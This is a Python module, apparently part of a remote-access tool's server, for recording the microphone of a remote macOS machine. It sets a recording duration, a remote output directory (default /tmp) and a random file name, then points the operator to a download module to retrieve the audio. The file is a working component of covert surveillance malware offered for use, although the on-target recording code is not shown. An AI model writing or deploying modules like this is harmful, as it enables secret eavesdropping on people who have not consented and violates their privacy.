# -*- coding: utf-8 -*-
__author__ = "Marten4n6", "Cline"
__license__ = "GPLv3"

from server.modules.helper import *


class Module(ModuleABC):
    def get_info(self):
        return {
            "Author": ["Marten4n6", "Cline"],
            "Description": "Record the microphone (MP3).",
            "References": [
                "https://developer.apple.com/documentation/avfoundation/avaudiorecorder"
            ],
            "Stoppable": False
        }

    def get_setup_messages(self):
        return [
            "Time in seconds to record (Leave empty for 5): ",
            "Remote output directory (Leave empty for /tmp): ",
            "Remote output name (Leave empty for <RANDOM>): "
        ]

    def setup(self, set_options):
        record_time = set_options[0]
        output_dir = set_options[1]
        output_name = set_options[2]

        if not record_time or not str(record_time).isdigit():
            record_time = 5
        else:
            record_time = int(record_time)
        if not output_dir:
            output_dir = "/tmp"
        if not output_name:
            output_name = random_string(8)

        return True, {
            "record_time": record_time,
            "output_dir": output_dir,
            "output_name": output_name
        }

    def process_response(self, response, response_options):
        str_response = response.decode()
        self._view.output_separator()
        self._view.output(str_response)
        if "Finished recording" in str_response:
            self._view.output("Use the download module to retrieve the audio file.", "info")
